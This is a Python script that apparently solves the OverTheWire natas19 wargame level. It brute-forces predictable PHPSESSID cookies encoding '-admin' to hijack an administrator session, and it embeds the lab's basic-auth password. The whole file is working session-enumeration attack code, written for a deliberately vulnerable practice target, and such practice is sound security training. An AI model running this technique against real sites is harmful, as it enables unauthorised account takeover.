#!/usr/bin/env python

import requests
import sys

target = 'http://natas19.natas.labs.overthewire.org'
auth = ('natas19','4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')
params = dict(username='admin', password='s3cr3t')
cookies = dict()

x = 0x0
y = 0x0
z = 0x0


while x <= 0xf:
    while y <= 0xf:
        while z <= 0xf:
            phpsessid = (('3%s3%s3%s2d61646d696e') %
                         (hex(x)[2:], hex(y)[2:], hex(z)[2:]))
            cookies['PHPSESSID'] = phpsessid
            print 'Trying with: %s' % phpsessid
            r = requests.get(target, auth=auth, params=params, cookies=cookies)
            if "You are logged in as a regular user." not in r.text:
                print r.text
                sys.exit(0)
            z += 1
        y += 1
        z = 0x0
    x += 1
    y = 0x0
    z = 0x0

sys.exit(1)
